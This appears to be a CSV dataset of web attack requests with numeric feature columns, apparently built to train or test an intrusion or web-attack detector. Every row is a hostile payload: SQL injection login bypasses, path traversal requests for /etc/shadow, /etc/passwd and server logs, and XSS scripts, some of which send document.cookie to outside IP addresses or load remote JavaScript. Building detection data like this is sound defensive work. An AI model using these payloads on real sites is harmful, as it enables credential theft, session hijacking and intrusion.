53,2,200,6516,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1905,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2574,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2712,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1507,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7637,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7821,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1017,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7556,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4560,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2846,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6410,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6029,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4658,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6561,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2063,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2008,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6730,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4619,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1781,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6240,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3714,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7429,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7007,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3512,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4238,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2629,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2905,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4443,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5988,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4300,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5759,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6787,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
35,1,200,4806,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5336,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1292,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3010,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5249,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2396,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5902,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1191,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7168,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5608,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6788,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5651,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7163,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3533,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5219,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2374,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2062,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7543,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,2124,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,4114,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,3106,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1986,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7386,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6192,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1415,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7901,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,3926,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,5464,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2739,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4618,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7431,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4461,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1307,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4522,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,3311,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6563,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4311,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2314,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
81,1,200,2292,7,38,14,5,2,GET /?file=<script>window.location.href="http://160.138.75.158"</script> HTTP/1.1
102,1,200,7507,7,56,19,6,2,GET /?search=<script>window.location='http://90.243.93.252/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,7754,7,56,19,6,2,GET /?search=<script>window.location='http://100.171.56.191/?cookie='+document.cookie</script> HTTP/1.1
60,1,200,1586,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3615,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2180,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2932,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5202,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6343,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,4236,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1412,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,6071,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,2571,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1189,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,1456,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5021,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,3402,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
60,1,200,5439,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
62,1,200,6680,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,3956,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1765,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6938,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,3547,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4301,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4455,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6224,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5307,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5166,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6754,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4374,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,7628,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6108,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5176,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4767,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4689,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,3374,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,5083,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4519,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,6182,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,1374,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
62,1,200,4838,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
58,1,200,2603,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,3353,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2249,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2357,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6281,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
83,1,200,6416,7,31,17,6,2,GET /?name=<script><script+src="http://243.169.62.233/299318.js=></script> HTTP/1.1
32,1,200,1424,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1557,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5959,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3516,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5039,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3202,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3383,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7037,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1671,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7759,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7246,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1498,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1018,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1848,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6238,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5584,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5151,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1330,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6556,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6578,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2317,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3258,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2102,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2315,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7617,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3304,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4130,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4794,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5911,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4878,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4292,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5582,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3095,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5063,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5758,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3289,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3346,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2731,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6784,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5810,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2138,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4725,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4720,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7311,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5867,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7532,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6115,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3945,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5638,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3385,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6041,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4654,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5208,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1023,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1463,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7951,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6267,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4590,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2242,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6247,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6631,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6781,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3826,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4563,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6257,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7918,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3967,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5925,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3273,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7078,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6974,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4847,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4678,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2706,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6901,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4586,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6541,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2713,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
51,1,200,7581,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,1311,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4415,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3497,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2459,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5737,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4256,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4526,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5800,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
59,1,200,7616,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,5411,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1411,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,6064,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,4720,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,3471,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,7275,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,7678,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,5765,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,1187,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
59,1,200,2357,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
50,1,200,4322,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,6919,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,1804,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2313,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,4629,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2438,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3050,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,2105,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,5406,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3295,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
50,1,200,3355,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
51,1,200,6942,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,3655,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2989,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,5983,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,2080,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
51,1,200,4680,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
81,1,200,3572,8,30,16,6,2,GET /?file=<script>%window.open('http://169.15.100.85/313694')3C/script> HTTP/1.1
84,1,200,5540,7,33,17,6,2,GET /?search=<script><script+src="http://165.135.187.5/108245.js=></script> HTTP/1.1
77,1,200,6054,8,27,16,6,2,GET /?p=<script>%window.open('http://92.182.82.89/254393')3C/script> HTTP/1.1
80,1,200,4837,7,28,17,6,2,GET /?p=<script><script+src="http://152.92.206.132/625375.js=></script> HTTP/1.1
82,1,200,3814,7,31,17,6,2,GET /?file=<script><script+src="http://99.75.146.162/148348.js=></script> HTTP/1.1
80,1,200,6801,7,38,14,5,2,GET /?file=<script>window.location.href="http://80.26.192.223"</script> HTTP/1.1
80,1,200,4555,8,30,16,6,2,GET /?file=<script>%window.open('http://100.32.56.21/454104')3C/script> HTTP/1.1
53,1,200,7757,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2212,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,7824,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,5449,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3599,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6946,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6519,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4811,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1440,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1672,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1509,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,7942,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,5277,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
78,1,200,6292,7,28,17,6,2,GET /?p=<script><script+src="http://32.69.248.230/39488.js=></script> HTTP/1.1
83,1,200,4867,7,33,17,6,2,GET /?search=<script><script+src="http://28.248.6.178/622019.js=></script> HTTP/1.1
101,1,200,2104,7,56,19,6,2,GET /?search=<script>window.location='http://46.138.82.22/?cookie='+document.cookie</script> HTTP/1.1
59,1,200,3537,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2847,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1352,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,7180,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1564,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2288,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
48,1,200,1584,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5614,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7894,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7726,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7664,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1117,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2270,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2744,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1841,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,6499,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1605,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,6507,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7934,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7130,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
60,1,200,6096,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5544,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,6697,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2938,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,2726,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,7986,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,5592,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
60,1,200,1523,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
77,1,200,1551,8,27,16,6,2,GET /?p=<script>%window.open('http://76.8.153.111/964918')3C/script> HTTP/1.1
83,1,200,1744,8,32,16,6,2,GET /?search=<script>%window.open('http://189.73.91.226/366686')3C/script> HTTP/1.1
49,1,200,1805,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3983,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2549,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,1407,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4970,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,6051,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5554,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3728,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2354,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,4998,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,1071,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
